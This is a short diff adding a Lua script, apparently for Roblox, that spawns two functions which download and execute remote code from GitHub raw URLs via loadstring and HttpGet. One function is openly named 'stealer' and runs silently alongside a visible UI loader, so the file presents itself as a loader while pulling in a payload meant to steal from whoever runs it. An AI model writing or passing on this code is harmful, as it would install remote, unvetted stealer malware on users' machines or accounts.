@@ -1,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/arkosigma/main/refs/heads/main/gag'))()
+end
+local function loadui()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/arkosigma/main/refs/heads/main/loader'))()
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
